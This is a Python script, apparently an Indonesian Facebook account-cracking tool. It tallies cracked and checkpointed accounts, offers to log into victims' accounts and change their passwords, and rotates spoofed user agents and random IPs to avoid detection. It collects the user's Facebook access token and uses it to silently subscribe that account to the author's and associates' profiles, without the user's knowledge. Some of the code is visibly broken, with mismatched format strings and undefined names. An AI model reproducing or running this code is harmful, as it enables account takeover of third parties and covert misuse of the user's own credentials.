#!/usr/bin/python3
# FENZ O. CONNER PROJECT IS BIG CHANGE
# RECORD BOLEH TAPI SERTAKAN NAMA AUTHOR
# JANGAN KAYA GW,,UBAH NAMA AUTHOR
# Versi 2.1

import time,os

try:
        tema = open("tema.txt","r").read()
except IOError:
        tema = "default"

if "default" in tema:
        p = "\33[1;97m" # putih
        a = "\033[96;1m"
        d = "\033[90;1m"
        l = "\33[0;37m" # putih gelap
        m = "\33[1;31m" # merah
        h = "\33[1;92m" # hijau
        k = "\33[1;93m" # kuning
        b = "\33[1;94m" # biru
        u = "\33[1;95m" # ungu
        s = "\33[1;96m" # biru muda
        o = "\33[1;96m" # biru muda
elif "biru" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        k = "\33[1;31m" # merah
        m = "\33[1;92m" # hijau
        u = "\33[1;93m" # kuning
        h = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        s = "\33[1;96m" # biru muda
elif "merah" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        h = "\33[1;31m" # merah
        m = "\33[1;92m" # hijau
        s = "\33[1;93m" # kuning
        k = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        u = "\33[1;96m" # biru muda
elif "kuning" in tema:
        p = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        m = "\33[1;31m" # merah
        k = "\33[1;92m" # hijau
        h = "\33[1;93m" # kuning
        u = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        s = "\33[1;96m" # biru muda

balmond = s+"["+l+"••"+s+"]"

try:
	import concurrent.futures
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Futures Belum Terinstall, Jalankan pip install futures")
	time.sleep(0.5)
	exit()
try:
	import requests
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Requests Belum Terinstall, Jalankan pip install requests")
	time.sleep(0.5)
	exit()
try:
	import bs4
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Bs4 Belum Terinstall, Jalankan pip install bs4")
	time.sleep(0.5)
	exit()
try:
	import mechanize
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Mechanize Belum Terinstall, Jalankan pip install mechanize")
	time.sleep(0.5)
	exit()

import concurrent.futures, requests, bs4, mechanize, sys, random, json, re, ipaddress, calendar
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
from random import randint
from datetime import datetime
from datetime import date

ok = []
cp = []
id = []
opsit = []
sandi = []
til = "•"
batas = "                                                                 "
line = "_______________________________________________"

indah = ["Jihan","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]

status_foll =[]
data_followers = []
pencarian_ = []


kamu = datetime.now()
cantiks = kamu.day
imuts = kamu.month
gemess = kamu.year
sayangs = indah[imuts]
manyun = date.today()
nama_h = calendar.day_name[manyun.weekday()]
if nama_h=="Sunday":
	nama_hari = "Minggu"
elif nama_h=="Monday":
	nama_hari = "Senin"
elif nama_h=="Tuesday":
	nama_hari = "Selasa"
elif nama_h=="Wednesday":
	nama_hari = "Rabu"
elif nama_h=="Thursday":
	nama_hari = "Kamis"
elif nama_h=="Friday":
	nama_hari = "Jumat"
elif nama_h=="Saturday":
	nama_hari = "Sabtu"
hck = "%s-%s-%s-%s"%(nama_hari,cantiks,sayangs,gemess)

semoga = []
berapa_d = []

joined_year = ["{2004 - 2005}","{2005 - 2006}","{2006 - 2007}","{2007 - 2008}","{2008}","{2009 - 2010}"]
old_gak = []
random_gak = []

try:
	jihan = open("token.txt","r").read()
except IOError:
	pass

try:
	kalo_random = open("uren","r").readlines()
except IOError:
	kalo_random = ['Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70', 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2\t ', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723', 'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672', 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226', 'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0\t ', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807']

def jalan(ms):
	for sir in ms + "\n":
		sys.stdout.write(sir)
		sys.stdout.flush()
		time.sleep(0.05)

def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print("\n"+balmond+l+" Crack Selesai...\n"%(s,l,s))
        print(balmond+l+" total OK : %s%s%s"%(s,l,h,str(len(ok)),s))
        print(balmond+l+" total CP : %s%s%s"%(s,l,k,str(len(cp)),s))
        cek_cp = input(f"\n [{s}?{l}] munculkan opsi checkpoint detedtor [Y/t]: ")
        if cek_cp =="":
            print(f"\n [{m}!{l}] jangan kosong");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" [{m}!{l}] hidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(5)
            ww=input(f"\n [{s}?{l}] ubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" [{h}•{l}] contoh password : {h}yayanxd{l}")
                pwBar=input(f"\n [{h}+{l}] masukan password baru : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(s,m,s))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('>') 
                jalan(f' {l}[{m}>{l}] mencoba login ke akun : {k}{kontol.replace(" [×] ", "")}{l}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            print('   [ %sProses Pengecekan Selesai %s]\n'%(h,l))
            input(' [ %sKEMBALI%s ] '%(s,l));menu()
        elif cek_cp in["T","t"]:
            exit(f"\n  {s}*{l} Selamat tinggal:)")
        else:
            print(f"\n [{m}!{l}] Y/t goblok");hasil(ok,cp)
    else:
        print('\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(m,l));exit()

def clear():
	os.system("clear")

# LOGO

def banner():
	print(s+"""
__________              ______________ 
___  ____/_____ _______ ______  /___(_)
__  /_    _  _ \__  __ \_  __  / __  / 
_  __/    /  __/_  / / // /_/ /  _  /  
/_/       \___/ /_/ /_/ \__,_/   /_/   
                                       
\33[1;97mAUTHOR   : FENZ O. CONNER
GITHUB   : GITHUB.COM/FENZOCONNER
FACEBOOK : FENZ O. CONNER\33[0;97m\n"""+s+line)

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES # IP
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES # IP

def random_ipv4():
	return ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))


# LOGIN
		
def login():
	clear()
	banner()
	token = input("\n"+balmond+l+" Masukkan Token Facebook : "+s)
	try:
		hujan = requests.get("https://graph.facebook.com/me?access_token="+token)
		batu = json.loads(hujan.text)
		air = batu["name"]
		api = open("token.txt","w");api.write(token);api.close()
		jalan(balmond+l+" Login Sukses")
		time.sleep(0.5)
		bot()
	except KeyError:
		jalan(balmond+m+" Login Gagal")
		time.sleep(0.5)
		login()

# BOT

def bot():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	print(balmond+l+" Sabar Ya, Bot Follow Dulu :v")
	komentar = random.choice(["sc lu gg parah bang","gw suka sc lu bang","bang kok lu jenius sih bang","lo ngentod bang"])
	komen = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Gua Pengin Jadi Kek Lu Bang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])
	requests.post("https://graph.facebook.com/100026788095748/subscribers?access_token="+token) # Fenz
	requests.post("https://graph.facebook.com/100053131790762/subscribers?access_token="+token) # Tri
	requests.post("https://graph.facebook.com/100036185601606/subscribers?access_token="+token) # Rifa
	requests.post("https://graph.facebook.com/100010692996037/subscribers?access_token="+token) # FENZ
